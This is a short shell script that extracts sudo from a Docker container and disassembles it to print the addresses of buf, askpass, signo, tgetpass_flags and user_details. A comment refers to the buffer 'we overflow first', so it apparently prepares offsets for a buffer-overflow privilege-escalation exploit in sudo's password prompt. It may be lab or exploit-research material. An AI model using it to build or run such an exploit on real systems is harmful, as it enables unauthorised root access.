#!/bin/sh

# Build and copy file.
sudo docker cp $1:/usr/bin/sudo ./sudo

# Analyze local sudo.
echo ''
echo '----- ANALYSIS -----'
echo 'BUF'
objdump --disassemble=tgetpass ./sudo | grep '<buf' | awk '{print "0x" $(NF-1)}'
echo 'There should be two values, the higher one is the one we overflow first and we should use that.'

echo '--------------------'

echo 'ASK PASS'
objdump -D ./sudo | grep '<askpass' | awk '{print "0x" $(NF-1)}' | uniq

echo '--------------------'

echo 'SIGNO' 
objdump -D ./sudo | grep '<signo>' | awk '{print "0x" $(NF-1)}' | uniq

echo '--------------------'

echo 'TGETPASS FLAGS'
objdump -D ./sudo | grep '<tgetpass_flags>' | awk '{print "0x" $(NF-1)}' | uniq

echo '--------------------'

echo 'USER DETAILS:'
objdump -D ./sudo | grep '<user_details>' | awk '{print "0x" $(NF-1)}' | uniq

echo '--------------------'

rm ./sudo
